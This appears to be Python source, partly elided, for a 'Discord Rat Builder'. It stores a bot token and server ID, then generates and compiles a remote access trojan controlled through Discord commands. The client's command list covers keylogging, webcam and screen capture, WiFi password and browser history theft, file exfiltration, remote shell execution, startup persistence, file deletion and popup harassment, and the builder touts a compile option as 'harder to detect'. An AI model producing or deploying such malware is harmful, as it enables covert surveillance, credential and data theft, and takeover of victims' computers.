...
THEMES = {
    ...
    "purple": [
        ...
        "\033[38;2;130;0;220m",
        "\033[38;2;160;0;240m",
        "\033[38;2;180;30;255m",
        "\033[38;2;200;60;255m",
        "\033[38;2;220;100;255m",
        "\033[0m",
    ],
    "pink": [
        "\033[38;2;255;0;100m",
        "\033[38;2;255;20;120m",
        "\033[38;2;255;50;150m",
        "\033[38;2;255;80;170m",
        "\033[38;2;255;100;190m",
        "\033[38;2;255;130;210m",
        "\033[38;2;255;160;220m",
        "\033[0m",
    ],
    "dark": [
        "\033[38;2;60;60;60m",
    ...
    "bluepurple": [
        ...
        "\033[38;2;90;20;255m",
        "\033[38;2;120;0;255m",
        "\033[38;2;150;30;255m",
        "\033[38;2;180;60;255m",
        "\033[0m",
    ],
}
...
def load_theme():
    prefs_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "userprefs.txt")
...
def show_theme_menu():
    ...
    if os.path.exists(prefs_path):
        with open(prefs_path, "r") as f:
            ...
            if val in THEMES:
                current = val
    rainbow_print(f"Current theme: {current}")
    rainbow_print("Available themes: rainbow, blue, purple, pink, dark, bluepurple")
    choice = theme_input("Enter theme name (or press ENTER to keep current): ").strip().lower()
    if choice in THEMES:
        with open(prefs_path, "w") as f:
            f.write(choice)
        rainbow_print(f"Theme set to: {choice} - restart builder to apply.")
    elif choice == "":
        rainbow_print("Keeping current theme.")
    else:
        rainbow_print(f"Unknown theme '{choice}', keeping current.")
...
rainbow_print("=== Discord Rat Builder Made By EthicalGeek ===\n")

# ── TOKEN/GUILD SAVE & LOAD ────────────────────────────────────────────────────
config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "token_guild.txt")
...
def save_config(tok, gid):
    with open(config_path, "w") as f:
        f.write(str(tok) + "\n" + str(gid) + "\n")

saved_token, saved_guild = load_config()

if saved_token and saved_guild:
    rainbow_print(f"Loaded saved config from token_guild.txt")
    rainbow_print(f"Token: {saved_token[:20]}...  Guild: {saved_guild}")
    rainbow_print("(Delete token_guild.txt to enter new credentials)\n")
    token = saved_token
    try:
        guild = int(saved_guild)
    except:
        guild = 0
else:
    token_input = input(RAINBOW[0] + "Bot Token: " + RESET).strip()
    token = token_input if token_input else ''.join(random.choices(string.ascii_letters + string.digits + '.-_', k=72))

    guild_input = input(RAINBOW[3] + "Guild ID/Server ID: " + RESET).strip()
    guild_raw = guild_input if guild_input else ''.join(random.choices(string.digits, k=18))
    ...
    save_config(token, guild)
    rainbow_print("\nSaved to token_guild.txt - delete it to change credentials next time.\n")

os.system('cls')
rainbow_print("=== Discord Bot Builder Made By EthicalGeek ===\n")

output_folder = os.path.dirname(os.path.abspath(__file__))

client_code = f'''import discord
...
def make_help_embeds():
    def em(title, fields, page, total=5):
        e = discord.Embed(title=title, color=0x00ff88)
        for name, value in fields:
            e.add_field(name=f"`{{name}}`", value=value, inline=True)
    ...
    e1 = em("System & Info", [
        ...
        ("!processes", "Top 5 CPU processes"),
        ("!screenshot", "Grab screenshot"),
        ("!webcampic", "Webcam photo"),
        ("!camrec <sec>", "Record webcam 5-300s"),
    ...
    e2 = em("Files & Network", [
        ...
        ("!wifi-pass [ssid]", "WiFi passwords"),
        ("!disk", "Disk usage"),
        ("!drives", "List drives"),
        ("!netstat", "Network connections"),
        ("!files <path>", "List folder"),
        ("!folders [path]", "List only folders"),
        ("!ls", "List current dir"),
        ("!pwd", "Current directory"),
        ("!cd <path>", "Change directory"),
        ("!sendfile <path>", "Send file to Discord"),
        ("!delete <path>", "Delete file/folder"),
        ("!mkdir <name>", "Create folder"),
        ("!history", "All browser history zip"),
        ("!downloads [n]", "Recent downloads"),
    ], 2)

    e3 = em("Execution & System Control", [
        ("!upload [dir]", "Upload & run file"),
        ("!run <cmd>", "Run shell command"),
        ("!kill <name/pid>", "Kill process"),
        ("!killall", "Kill all user apps"),
        ("!tasklist", "Running tasks"),
        ("!exes", "Running .exe list"),
        ("!startup", "Startup programs"),
        ("!addstartup <path>", "Add .py to startup"),
        ("!env", "Environment variables"),
        ("!pythonpath", "sys.path list"),
        ("!who", "Logged in users"),
        ("!website <url>", "Open URL on PC"),
        ("!lock", "Lock workstation"),
        ("!shutdown <sec>", "Shutdown timer"),
        ("!cancelshutdown", "Cancel shutdown"),
        ("!restart", "Restart PC now"),
        ("!logoff", "Log off user"),
    ], 3)

    e4 = em("Input & Audio Control", [
        ("!keylogger start", "Start live keylogger"),
        ("!keylogger stop", "Stop keylogger"),
        ("!keylogger status", "Keylogger status"),
        ("!write <text>", "Type text on PC"),
        ("!typefast <text>", "Type text fast"),
        ("!press <key>", "Press a key"),
        ("!click", "Left click mouse"),
        ("!mousepos <x> <y>", "Move mouse"),
        ("!mousefollow on/off", "Mouse follow toggle"),
        ("!shake on/off", "Shake cursor toggle"),
        ("!autoclick <n> <d>", "Auto clicker"),
        ("!clipboard", "Read clipboard"),
        ("!volume <0-100>", "Set system volume"),
        ("!audio", "Play mp3/mp4/wav on PC speakers"),
        ("!audio-loop", "Loop audio on PC until stopped"),
        ("!audio-stop", "Stop looping audio"),
        ("!mute", "Mute audio"),
        ("!unmute", "Unmute audio"),
        ("!messagebox t txt", "Show popup"),
        ("!msgloop n/inf t txt", "Spam popups"),
        ("!hydra start/stop", "Hydra popups"),
    ], 4)

    e5 = em("Misc & Fun", [
        ("!wallpaper", "Set wallpaper from image"),
        ("!capslock on/off", "Lock Caps Lock on or release"),
        ("!capslock toggle", "Toggle Caps Lock once"),
        ("!fullscreen", "Press F11"),
        ("!fullscreen lock", "Lock fullscreen on"),
        ("!fullscreen unlock", "Unlock fullscreen"),
        ("!voice <text>", "TTS speak on PC"),
    ], 5)
...
async def help(ctx, page: int = 1):
    if not await check_channel(ctx):
        return
    embeds = make_help_embeds()
    idx = max(0, min(page - 1, len(embeds) - 1))
    view = HelpView(embeds, idx)
    await ctx.send(embed=embeds[idx], view=view)
...
async def processes(ctx):
    ...
    try:
        ...
        await ctx.send("Top 5 by CPU:\\n" + "\\n".join(procs) if procs else "No data.")
    except:
        await ctx.send("Error getting processes.")
...
async def installed(ctx):
    if not await check_channel(ctx):
        return
    try:
        output = subprocess.check_output(['wmic', 'product', 'get', 'name'], stderr=subprocess.STDOUT, text=True)
        lines = [line.strip() for line in output.splitlines() if line.strip() and not line.startswith("Name")]
        if lines:
            msg = "Installed programs (top 30):\\n" + "\\n".join(lines[:30])
            if len(lines) > 30:
                msg += "\\n... and more"
            await ctx.send(msg[:1900])
        else:
            await ctx.send("No programs found.")
    except Exception as e:
        await ctx.send(f"Error: {{str(e)}}")
...
async def startup(ctx):
    if not await check_channel(ctx):
        return
    try:
        output = subprocess.check_output("wmic startup get caption,command", shell=True, text=True)
        lines = [line.strip() for line in output.splitlines() if line.strip() and "Caption" not in line]
        if lines:
            await ctx.send("Startup programs:\\n" + "\\n".join(lines[:12]) + ("\\n... and more" if len(lines) > 12 else ""))
        else:
...
async def pythonpath(ctx):
    if not await check_channel(ctx):
        return
    paths = "\\n".join(sys.path[:15])
    await ctx.send(f"```\\n{{paths}}\\n```" + ("\\n... and more" if len(sys.path) > 15 else ""))
...
with open(os.path.join(output_folder, "client.py"), "w", encoding="utf-8") as f:
    f.write(client_code)

rainbow_print("=" * 50)
rainbow_print("COMPILE OPTIONS:")
rainbow_print("  [1] Nuitka      - slower compile, better output, harder to detect")
rainbow_print("  [2] PyInstaller - faster compile, easier to use")
rainbow_print("  [3] Skip        - don't compile")
rainbow_print("=" * 50)

compile_choice = input(RAINBOW[3] + "Choose compile method (1/2/3): " + RESET).strip()
...
def run_with_progress(cmd, label):
    ...
    try:
        ...
        progress_keywords = [
            "INFO", "WARNING", "ERROR", "Building", "Compiling", "Linking",
            "Generating", "Creating", "Including", "Copying", "Optimizing",
            "Finishing", "Complete", "Done", "Nuitka", "Running", "Collecting",
            "Adding", "Appending", "Checking", "Found", "bytes", "EXE"
        ]
        line_count = 0
        for line in process.stdout:
            ...
            if not line:
                continue
            line_count += 1
            show = any(kw.lower() in line.lower() for kw in progress_keywords)
            if show or line_count % 10 == 0:
                colored_line = ""
                colors = RAINBOW[:-1]
...
if compile_choice == "1":
    rainbow_print("\nUsing Nuitka compiler...")
    try:
        client_path = os.path.join(output_folder, "client.py")
        ...
        returncode = run_with_progress(compile_cmd, "Nuitka Compiling")
        if returncode == 0:
            rainbow_print("\nNuitka compilation SUCCESS!")
            rainbow_print(f"EXE saved to: {output_folder}")
        else:
            rainbow_print("\nNuitka compilation FAILED.")
            rainbow_print("Make sure Nuitka is installed: pip install nuitka")
    except Exception as e:
        rainbow_print(f"Compilation error: {{str(e)}}")

elif compile_choice == "2":
    rainbow_print("\nUsing PyInstaller compiler...")
    try:
        client_path = os.path.join(output_folder, "client.py")
        os.chdir(output_folder)
        compile_cmd = [
            ...
            "--specpath", os.path.join(output_folder, "spec"),
            client_path
        ]
        returncode = run_with_progress(compile_cmd, "PyInstaller Compiling")
        if returncode == 0:
            rainbow_print("\nPyInstaller compilation SUCCESS!")
            rainbow_print(f"EXE saved to: {output_folder}")
        else:
            rainbow_print("\nPyInstaller compilation FAILED.")
            rainbow_print("Make sure PyInstaller is installed: pip install pyinstaller")
    except Exception as e:
        rainbow_print(f"Compilation error: {{str(e)}}")

else:
    rainbow_print("Compilation skipped. client.py is ready.")
